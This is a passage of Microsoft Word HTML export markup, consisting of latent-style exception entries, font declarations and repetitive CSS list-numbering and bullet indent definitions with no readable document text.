<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="60"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Shading Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="60"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Shading Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="60"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Shading Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 6" ></w:LsdException>
</w:LatentStyles></xml><![endif]--><style>
@font-face{
font-family:"Times New Roman";
}

@font-face{
font-family:"ËÎÌå";
}

@font-face{
font-family:"Calibri";
}

@font-face{
font-family:"Calibri";
}

@font-face{
font-family:"Georgia";
}

@font-face{
font-family:"Wingdings";
}

@font-face{
font-family:"Courier New";
}

@font-face{
font-family:"Arial";
}

@font-face{
font-family:"MS UI Gothic";
}

@list l0:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l0:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l0:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l0:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l0:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l0:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l0:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l0:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l0:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l1:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:29.2500pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l1:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:71.8500pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l1:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:114.7000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l1:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:157.5500pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l1:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:200.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l1:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:243.2500pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l1:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:286.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l1:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:328.9500pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l1:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:371.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l2:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l2:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:70.0000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l2:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:112.4500pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l2:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:154.9500pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l2:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:197.4500pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l2:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:239.9500pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l2:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:282.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l2:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:324.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l2:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:367.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l3:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l3:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l3:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l3:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l3:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l3:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l3:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l3:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l3:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l4:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l4:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l4:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l4:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l4:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l4:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l4:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l4:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l4:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l5:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l5:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l5:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l5:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l5:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l5:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l5:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l5:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l5:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l6:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l6:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l6:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l6:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l6:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l6:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l6:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l6:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l6:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l7:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l7:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:43.0000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l7:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:92.0000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l7:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:141.0000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l7:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:190.0000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l7:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:239.0000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l7:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:288.0000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l7:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:337.0000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l7:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:386.0000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l8:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l8:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l8:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l8:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l8:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l8:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l8:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l8:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l8:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l9:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l9:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l9:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l9:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l9:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l9:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l9:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l9:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l9:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l10:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l10:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l10:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
